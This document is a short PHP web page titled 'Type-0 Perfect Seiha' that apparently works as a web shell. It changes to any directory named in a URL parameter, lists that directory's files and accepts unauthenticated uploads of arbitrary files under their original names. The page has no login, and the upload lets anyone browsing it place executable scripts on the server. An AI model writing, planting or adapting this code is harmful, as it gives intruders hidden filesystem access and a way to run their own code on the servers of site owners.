<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Type-0 Perfect Seiha</title>
    <style>
        body { font-family: Arial, sans-serif; }
        .container { max-width: 800px; margin: 20px auto; padding: 20px; border: 1px solid #ccc; }
        .file-list { list-style-type: none; padding: 0; }
        .file-list li { margin-bottom: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Type-0 Perfect Seiha</h2>

        <?php
        
        function listFiles($dir) {
            if (is_dir($dir)) {
                if ($dh = opendir($dir)) {
                    echo '<ul class="file-list">';
                    while (($file = readdir($dh)) !== false) {
                        if ($file != '.' && $file != '..') {
                            echo '<li>'.$file.'</li>';
                        }
                    }
                    echo '</ul>';
                    closedir($dh);
                }
            } else {
                echo '<p>Not a valid directory.</p>';
            }
        }

        
        if (isset($_GET['dir'])) {
            $newDir = $_GET['dir'];
            chdir($newDir);
        }

        
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
            $uploadDir = './';
            $uploadFile = $uploadDir . basename($_FILES['file']['name']);
            if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
                echo '<p>File uploaded successfully.</p>';
            } else {
                echo '<p>Failed to upload file.</p>';
            }
        }
        ?>

        
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="file">
            <button type="submit">Upload</button>
        </form>

        <hr>

        
        <h3>Current Directory: <?php echo getcwd(); ?></h3>

        
        <?php
        listFiles('./');
        ?>

        <hr>

        
        <form method="GET">
            <label for="dir">Change Directory:</label>
            <input type="text" id="dir" name="dir" placeholder="Enter directory path">
            <button type="submit">Go</button>
        </form>
    </div>
</body>
</html>
